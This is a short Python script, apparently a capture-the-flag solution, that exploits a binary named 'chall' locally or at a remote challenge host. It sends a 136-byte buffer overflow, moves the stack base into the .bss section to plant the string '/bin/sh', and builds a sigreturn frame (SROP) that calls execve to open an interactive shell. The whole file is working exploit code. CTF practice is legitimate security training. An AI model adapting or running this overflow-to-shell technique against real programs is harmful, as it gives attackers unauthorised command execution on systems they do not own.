#!/usr/bin/env python3

""" This script write /bin/sh string in (rbp - 0x80) before that rbp is set to 
p64(0x404050+0x80) this address in .bss section so /bin/sh will be written to 0x404050 that address (0x401212) this dibert execution to read instruction and then use srop
"""

from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    io = remote('chall.v1t.site', 30211)
else:
    io = process('./chall')
io.sendlineafter(b"pond.\n", b"A"*136 + p64(0x40117d) + p64(0x404050+0x80)+ p64(0x401212))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404050
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x4011f1

io.sendline(b"/bin/sh\x00".ljust(8,b'\x00') + p64(0x0)*16 + p64(0x4011ef) + p64(0xf) + p64(0x4011f1) + bytes(frame))
io.interactive()